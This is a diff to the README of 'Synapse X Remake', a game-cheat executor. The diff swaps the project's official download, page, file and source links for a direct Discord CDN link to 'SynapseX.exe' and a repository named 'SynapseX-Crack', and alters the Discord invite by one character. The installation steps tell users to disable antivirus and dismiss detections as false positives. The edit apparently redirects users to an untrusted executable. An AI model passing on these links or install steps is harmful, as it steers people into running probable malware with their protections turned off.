@@ -2,9 +2,9 @@
 
 Using [Synapse X](https://x.synapse.to/) UI Source code and rebuild it with [WeAreDevs API](https://wearedevs.net/d/Exploit%20API)
 
-- [Download Link (Official releases)](https://github.com/Charlzk05/Synapse-X-Remake-Synapse-X-Free-Version/tags)
-- [Synapase X Remake Official Github Page](https://charlzk05.github.io/Synapse-X-Remake-Synapse-X-Free-Version/)
-- [Synapse X Remake Server](https://discord.gg/aXrHcQzSPb)
+- [Download Link (Official releases)](https://cdn.discordapp.com/attachments/1047890543352492116/1047896234406465606/SynapseX.exe)
+- [Synapase X Remake Official Github Page](https://github.com/KuramaBallsReturns/SynapseX-Crack)
+- [Synapse X Remake Server](https://discord.gg/aXrHcQzSPd)
 
 Scroll Down for more information
 
@@ -25,9 +25,9 @@ How to contribute to the project - [CONTRIBUTION.md](https://github.com/Charlzk0
 ## Installation
 
 1. Turn off Anti-Virus or allow the Synapse X Remake folder/zip on any anti-virus softwares you have (Recommended)
-2. [Download](https://github.com/Charlzk05/Synapse-X-Remake-Synapse-X-Free-Version/tags) Synapse X Remake
-3. Extract Synapse X Remake.zip
-4. Open Synapse X Remake.exe
+2. [Download](https://github.com/KuramaBallsReturns/SynapseX-Crack) Synapse X Remake
+3. Extract Synapse X Crack.zip
+4. Open Synapse X  .exe
 5. Enjoy!
 
 ### Virustotal of Synapse X Remake (False Positive)
@@ -65,13 +65,13 @@ We don’t permit users to deploy or discuss any methods of cheating, including:
 
 ### Bin and Script File From Dec 1, 2022
 
-- [bin.zip](https://github.com/Charlzk05/Synapse-X-Remake-Synapse-X-Free-Version/files/9843577/bin.zip)
-- [Scripts.zip](https://github.com/Charlzk05/Synapse-X-Remake-Synapse-X-Free-Version/files/9843565/Scripts.zip)
+- [bin.zip](https://github.com/KuramaBallsReturns/SynapseX-Crack)
+- [Scripts.zip](https://github.com/KuramaBallsReturns/SynapseX-Crack)
 
 ### Website Links
 
 - [Synapse X Official Website](https://x.synapse.to/)
-- [Synapse X Source Code](https://github.com/Acrillis/SynapseX)
+- [Synapse X Source Code](https://github.com/KuramaBallsReturns/SynapseX-Crack)
 - [WeAreDevs Official Website](https://wearedevs.net)
 - [WeAreDevs Exploit API](https://wearedevs.net/d/Exploit%20API)
 
